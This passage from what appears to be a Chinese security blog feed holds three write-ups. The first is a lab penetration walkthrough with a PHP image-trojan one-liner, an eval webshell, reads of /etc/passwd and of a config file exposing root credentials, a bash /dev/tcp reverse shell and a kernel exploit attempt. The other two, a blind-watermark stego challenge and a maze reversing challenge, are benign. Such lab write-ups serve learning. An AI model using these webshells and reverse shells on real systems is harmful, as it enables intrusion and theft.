					<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'uploaded_images/'</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
							 <span class="token punctuation">&#123;</span>
							  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Uploaded successfully "</span><span class="token punctuation">;</span>
							  <span class="token variable">$update</span><span class="token operator">=</span><span class="token string single-quoted-string">'insert into users(name,address,image,id) values(\''</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'\',\''</span><span class="token operator">.</span><span class="token variable">$address</span><span class="token operator">.</span><span class="token string single-quoted-string">'\',\''</span><span class="token operator">.</span><span class="token variable">$iname</span><span class="token operator">.</span><span class="token string single-quoted-string">'\', \''</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string single-quoted-string">'\')'</span><span class="token punctuation">;</span> 
							 <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$update</span><span class="token punctuation">)</span><span class="token punctuation">;</span>				  
							<span class="token punctuation">&#125;</span>
				<span class="token punctuation">&#125;</span>
			<span class="token keyword">else</span>
			<span class="token punctuation">&#123;</span>
				<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>i told you dear, only png,jpg and gif file are allowed"</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span>
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>only png,jpg and gif file are allowed"</span><span class="token punctuation">;</span>	
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>随便找一张jpg图片，用010 editor在图片末尾加上</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427110924330.png" alt="image-20220427110924330" loading="lazy"></p>
<p>之后上传文件，显示成功，且根据前面得到的目录，不难猜测应该是保存在<code>uploaded_images</code>目录下</p>
<p>来测试一下文件到底有没有成功包含，使用burp，在URL的post请求中加入<code>POST /panel.php?cmd=cat%20/etc/passwd</code>，正文中加入<code>load=uploaded_images/ma.jpg&amp;continue=continue</code></p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427111529624.png" alt="image-20220427111529624" loading="lazy"></p>
<p>可以看到命令已经成功执行。想想怎么用菜刀链接呢？根据前面可知照片是以POST访问的，而菜刀只能以GET访问，所以菜刀是不能连接这个图片马的。</p>
<p>换个思路，在之前图片马的基础上，写入一句话文件，菜刀连接一句话文件。使用burp执行命令，直接以POST方式写一句到<code>uploaded_images</code>下的<code>webshell.php</code></p>
<p>要注意的是一句话要通过url编码，<code>echo &#39;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&#39; &gt;&gt; uploaded_images/webshell.php</code></p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427112425022.png" alt="image-20220427112425022" loading="lazy"></p>
<p>再次访问图片马 <code>cat uplaoded_images/webshell.php</code> （同样经过url编码）发现确实写入了</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427112737982.png" alt="image-20220427112737982" loading="lazy"></p>
<p>之后利用菜刀成功连接</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427113044235.png" alt="image-20220427113044235" loading="lazy"></p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427112930621.png" alt="image-20220427112930621" loading="lazy"></p>
<p>可以在根目录下找到flag（这次是真的flag）</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220428140548320.png" alt="image-20220428140548320" loading="lazy"></p>
<h2 id="失败的提权"><a href="#失败的提权" class="headerlink" title="失败的提权"></a>失败的提权</h2><p>为什么说是失败的提权，因为我用的这三种方法都没有成功（哭）</p>
<h3 id="方法一：ssh登录"><a href="#方法一：ssh登录" class="headerlink" title="方法一：ssh登录"></a>方法一：ssh登录</h3><p>由前面的靶机端口可探测到22端口，意味着只需要得到主机的账号密码就可以成功了<br>又联想到PHP默认配置文件是<code>config.inc.php</code>，系统路径结合<code>phpmy</code>（这边我都试了一下，发现在phpmy下）<br>同样利用任意文件下载phpmy&#x2F;config.inc.php，直接查看账户信息</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427122134298.png" alt="image-20220427122134298" loading="lazy"></p>
<p>得到用户名为<code>root</code>，密码为<code>roottoor</code>，尝试连接</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427135721856.png" alt="image-20220427135721856" loading="lazy"></p>
<p>连接失败了，有两个原因：<br>1、远程服务器没有添加公钥（无法认证）<br>2、远程服务器公钥文件夹权限错误（<code>.ssh</code>和<code>.ssh/authorized_keys</code>需要保证只有用户自己有权限，否则验证无效）</p>
<p>由于这俩都是指向靶机，我在菜刀里也没找到这俩文件，所以放弃这种方法。但至少我们获取了root的账号密码。</p>
<h3 id="方法二：反弹shell"><a href="#方法二：反弹shell" class="headerlink" title="方法二：反弹shell"></a>方法二：反弹shell</h3><p>kali命令行里输入nc -lvnp 6666开始监听，同时burp的post请求中执行<code>echo “bash -i &gt;&amp; /dev/tcp/192.168.113.130/6666 0&gt;&amp;1” | bash</code>（我kali机的IP地址为192.168.113.130），同样要先经过URL编码才能发送。</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427140311116.png" alt="image-20220427140311116" loading="lazy"></p>
<p>kali监听</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427140401082.png" alt="image-20220427140401082" loading="lazy"></p>
<p>POST发送反弹shell命令</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427152028592.png" alt="image-20220427152028592" loading="lazy"></p>
<p>遗憾的是，kali机并没有反弹会话…</p>
<p>我真傻，真的，我单单学者如何反弹shell，却没注意它的前提。前提是攻击机在公网ip，但是我的kali机是在内网的，靶机反弹的shell找不到在内网的kali机，所以就监听不到任何东西了…</p>
<p>由于我也是才接触渗透提权这块，还不是很了解，所以就没有找到很好的解决方法（或许可以找一个公网IP？）。</p>
<h3 id="方法三：菜刀"><a href="#方法三：菜刀" class="headerlink" title="方法三：菜刀"></a>方法三：菜刀</h3><p>在上述使用菜刀连接后，利用其自带的虚拟终端功能，查看系统内核版本，寻找提权exp。命令为<code>uanme -a</code>和<code>cat /etc/issue</code></p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427143354789.png" alt="image-20220427143354789" loading="lazy"></p>
<p>可以在kali机上寻找与版本对应的Ubuntu本地提权漏洞exp</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427143651845.png" alt="image-20220427143651845" loading="lazy"></p>
<p>去<a href="https://link.zhihu.com/?target=https://www.exploit-db.com/exploits/37292/">官网</a>下载exp后将文件导入菜刀</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427143902000.png" alt="image-20220427143902000" loading="lazy"></p>
<p>赋予执行权限 <code>chmod 777 37292.c</code>；编译exp <code>gcc 37292.c -o exp</code>；执行exp，提权至root</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427144426329.png" alt="image-20220427144426329" loading="lazy"></p>
<p>但最后还是失败了…不知道啥原因</p>
<p>麻了麻了这个提权搞了好久一直不成功，到最后也没有找到一种成功的方法。针对这个靶场的渗透就先做到这里，毕竟是第一次就一个靶场进行完整的渗透，在这个过程中也学到了很多之前或忽略或遗忘的知识，以及很多新的知识。后续会重点关注如何提权，会慢慢学习的XoX</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF-Sept-X-双目失明，身残志坚</title>
    <url>/2022/04/28/DASCTF-Sept-X-%E5%8F%8C%E7%9B%AE%E5%A4%B1%E6%98%8E%EF%BC%8C%E8%BA%AB%E6%AE%8B%E5%BF%97%E5%9D%9A/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h1 id="题目内涵"><a href="#题目内涵" class="headerlink" title="题目内涵"></a>题目内涵</h1><p>一开始不知道题目是啥意思，把压缩包下载解压得到两张图片，瞬间明白了，绷不住了…</p>
<p><img src="/2022/04/28/DASCTF-Sept-X-%E5%8F%8C%E7%9B%AE%E5%A4%B1%E6%98%8E%EF%BC%8C%E8%BA%AB%E6%AE%8B%E5%BF%97%E5%9D%9A/image-20220428142736975.png" alt="image-20220428142736975" loading="lazy"></p>
<p>这是大图，想必大家都知道东京奥运会体操裁判双目失明仍然坚守岗位的事吧（狗头保命）</p>
<p><img src="/2022/04/28/DASCTF-Sept-X-%E5%8F%8C%E7%9B%AE%E5%A4%B1%E6%98%8E%EF%BC%8C%E8%BA%AB%E6%AE%8B%E5%BF%97%E5%9D%9A/image-20220428142913209.png" alt="image-20220428142913209" loading="lazy"></p>
<span id="more"></span>

<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>给了两张图，看来是双图隐写的类型。针对双图，有两个解题思路。</p>
<p>其一：我们可以通过小工具进行比较，对图片中的数据进行计算得到新的图片获取信息；</p>
<p>其二：盲水印攻击，提取水印图片。</p>
<p>由于拿到图片不知道是什么类型，只能一个个试。</p>
<h2 id="两图对比"><a href="#两图对比" class="headerlink" title="两图对比"></a>两图对比</h2><p>首先用StegSolve看看能不能比较出啥</p>
<p>先看看原图的各个通道有没有什么信息</p>
<p><img src="/2022/04/28/DASCTF-Sept-X-%E5%8F%8C%E7%9B%AE%E5%A4%B1%E6%98%8E%EF%BC%8C%E8%BA%AB%E6%AE%8B%E5%BF%97%E5%9D%9A/image-20220428143524342.png" alt="image-20220428143524342" loading="lazy"></p>
<p><img src="/2022/04/28/DASCTF-Sept-X-%E5%8F%8C%E7%9B%AE%E5%A4%B1%E6%98%8E%EF%BC%8C%E8%BA%AB%E6%AE%8B%E5%BF%97%E5%9D%9A/image-20220428143532137.png" alt="image-20220428143532137" loading="lazy"></p>
<p>看不出啥，直接两图对比，实验发现进行的一些数据对比运算也得不到有效的图片</p>
<p><img src="/2022/04/28/DASCTF-Sept-X-%E5%8F%8C%E7%9B%AE%E5%A4%B1%E6%98%8E%EF%BC%8C%E8%BA%AB%E6%AE%8B%E5%BF%97%E5%9D%9A/image-20220428143326273.png" alt="image-20220428143326273" loading="lazy"></p>
<p><img src="/2022/04/28/DASCTF-Sept-X-%E5%8F%8C%E7%9B%AE%E5%A4%B1%E6%98%8E%EF%BC%8C%E8%BA%AB%E6%AE%8B%E5%BF%97%E5%9D%9A/image-20220428143337173.png" alt="image-20220428143337173" loading="lazy"></p>
<p>试试另一款小工具Beyond Compare3，然鹅也不行</p>
<p><img src="/2022/04/28/DASCTF-Sept-X-%E5%8F%8C%E7%9B%AE%E5%A4%B1%E6%98%8E%EF%BC%8C%E8%BA%AB%E6%AE%8B%E5%BF%97%E5%9D%9A/image-20220428143736250.png" alt="image-20220428143736250" loading="lazy"></p>
<h2 id="盲水印攻击"><a href="#盲水印攻击" class="headerlink" title="盲水印攻击"></a>盲水印攻击</h2><p>啥都对比不出来，那可能就是盲水印攻击了。</p>
<p>这是GitHub上的一个盲水印脚本：<a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p>
<p>由于我是python2的版本，所以就用命令<code>python bwm.py decode original.png blind.png flag.png</code> 得到图片</p>
<p><img src="/2022/04/28/DASCTF-Sept-X-%E5%8F%8C%E7%9B%AE%E5%A4%B1%E6%98%8E%EF%BC%8C%E8%BA%AB%E6%AE%8B%E5%BF%97%E5%9D%9A/202109251641501.png" alt="img" loading="lazy"></p>
<p>可以看到有一行行的白点和黑点。是不是二进制序列呢？设白点为0，黑点为1或白点为1黑点为0的两种情况都是不行的。</p>
<p>后来网上查了一些资料了解到这应该是盲文，属于是和标题呼应了。具体参见：<a href="https://zhuanlan.zhihu.com/p/24445456">https://zhuanlan.zhihu.com/p/24445456</a></p>
<p>对照着表翻译过来为<code>zhejianggongiedaxüe</code>，提交上去是不对的。由于是浙江工业大学春季挑战赛，故修正为<code>zhejianggongyedaxue</code></p>
<p>即<code>flag&#123;zhejianggongyedaxue&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界Reverse-maze</title>
    <url>/2022/05/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse-maze/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>今天在云演平台上看reverse模块最后一节讲的是迷宫问题，觉得挺有意思。去攻防世界看了看，Reverse模块新手练习区的最后一题就是迷宫问题（maze），所以拿来练练手。</p>
<h1 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h1><p>将附件下载下来之后，用 Exeinfo PE 分析，可见不是exe可执行文件，而是ELF。且此文件是64位，加壳与否信息未知，我们用IDA Pro64位进行静态分析。</p>
<p><img src="/2022/05/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse-maze/image-20220512170725889.png" alt="image-20220512170725889" loading="lazy"></p>
<span id="more"></span>

<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><h2 id="shift-F12查看字符串窗口"><a href="#shift-F12查看字符串窗口" class="headerlink" title="shift + F12查看字符串窗口"></a>shift + F12查看字符串窗口</h2><p>首先查看字符串窗口，发现最底下一串字符是由 * ，# 以及空格组成的，不难猜测出这应该就是迷宫了。其次，Congratulations代表恭喜，这里面是不是有 flag 的信息呢？我们点进去看看。</p>
<p><img src="/2022/05/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse-maze/image-20220512170850061.png" alt="image-20220512170850061" loading="lazy"></p>
<h2 id="F5查看伪代码"><a href="#F5查看伪代码" class="headerlink" title="F5查看伪代码"></a>F5查看伪代码</h2><p><img src="/2022/05/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse-maze/image-20220512171221304.png" alt="image-20220512171221304" loading="lazy"></p>
<p>发现背后是 main 函数，F5查看伪代码</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">_int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// bp</span>
  <span class="token keyword">char</span> v6<span class="token punctuation">;</span> <span class="token comment">// al</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h] BYREF</span>
  <span class="token keyword">int</span> v10<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-24h] BYREF</span>

  v10<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">24</span> <span class="token operator">||</span> <span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"nctf&#123;"</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_6010BF <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">125</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
LABEL_22<span class="token operator">:</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  v3 <span class="token operator">=</span> <span class="token number">5LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1 <span class="token operator">+</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">></span> <span class="token number">78</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v4 <span class="token operator">==</span> <span class="token number">79</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          v6 <span class="token operator">=</span> <span class="token function">sub_400650</span><span class="token punctuation">(</span>v10<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v4 <span class="token operator">==</span> <span class="token number">111</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          v6 <span class="token operator">=</span> <span class="token function">sub_400660</span><span class="token punctuation">(</span>v10<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v4 <span class="token operator">==</span> <span class="token number">46</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          v6 <span class="token operator">=</span> <span class="token function">sub_400670</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v4 <span class="token operator">==</span> <span class="token number">48</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          v6 <span class="token operator">=</span> <span class="token function">sub_400680</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>
LABEL_14<span class="token operator">:</span>
          v5 <span class="token operator">=</span> v6<span class="token punctuation">;</span>
          <span class="token keyword">goto</span> LABEL_15<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
LABEL_15<span class="token operator">:</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_400690</span><span class="token punctuation">(</span>asc_601060<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v10<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v9<span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token keyword">goto</span> LABEL_22<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v3 <span class="token operator">>=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
LABEL_20<span class="token operator">:</span>
        v7 <span class="token operator">=</span> <span class="token string">"Wrong flag!"</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_21<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> asc_601060<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> v9 <span class="token operator">+</span> v10<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">35</span> <span class="token punctuation">)</span>
    <span class="token keyword">goto</span> LABEL_20<span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token string">"Congratulations!"</span><span class="token punctuation">;</span>
LABEL_21<span class="token operator">:</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="来看重点"><a href="#来看重点" class="headerlink" title="来看重点"></a>来看重点</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">24</span> <span class="token operator">||</span> <span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"nctf&#123;"</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_6010BF <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">125</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
LABEL_22<span class="token operator">:</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们输入的字符串为 s1，当<strong>此字符串的长度不为24</strong>或者 <strong>s1的开头五个字符不为 “ nctf{ ”</strong> 或者<strong>最后一个字符不为 “ } ”</strong>时（对照ascii码表，125对应字符 } ），跳转到 LABEL_22，并输出 Wrong flag! 这意味着，最终的 flag 的基本格式为 <code>nctf&#123;18个字符&#125;</code></p>
<p>其次，循环中肉眼可见的四个判断语句</p>
<p><img src="/2022/05/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse-maze/image-20220512171955255.png" alt="image-20220512171955255" loading="lazy"></p>
<p>同样对照ascii码表，可得这几个字符分别为 ：<strong>O、o、.  、0</strong>，不难猜测出这就是我们来控制上下左右走出迷宫的四个方向符了，来查看其对应的操作。</p>
<p>• sub_400650</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">bool __fastcall <span class="token function">sub_400650</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// eax</span>

  v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token operator">--</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v1 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span>
